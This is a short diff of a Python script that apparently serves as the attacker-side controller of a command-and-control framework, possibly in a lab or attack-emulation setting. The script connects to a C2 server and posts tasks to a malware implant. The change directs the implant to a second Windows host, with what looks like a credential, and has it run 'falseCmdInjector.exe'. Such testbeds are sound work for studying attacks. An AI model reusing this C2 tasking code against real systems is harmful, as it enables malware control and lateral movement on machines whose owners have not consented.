@@ -2,7 +2,7 @@ import time
 import c2Client
 
 ownID = 'HackerSide'
-client = c2Client(ownID, '10.10.0.165', c2Port=5000)
+client = c2Client.c2Client(ownID, '10.10.0.165', c2Port=5000)
 
 taskInt = 100 # interval to assign task.
 
@@ -168,7 +168,7 @@ testTaskJson = {
             'repeat'    : 1,
             'exePreT'   : 0,
             'state'     : c2Client.TASK_P_FLG,
-            'taskData'  : "falseCmdInjector.exe"
+            'taskData'  : "10.10.0.187;ncl_win10_pro;123;falseCmdInjector.exe"
         }
 
 client.postTask(malware1id, testTaskJson)
@@ -183,7 +183,7 @@ testTaskJson = {
             'repeat'    : 1,
             'exePreT'   : 0,
             'state'     : c2Client.TASK_P_FLG,
-            'taskData'  : "falseCmdInjector.exe"
+            'taskData'  : "10.10.0.187;ncl_win10_pro;123;falseCmdInjector.exe"
         }
 
 client.postTask(malware1id, testTaskJson)
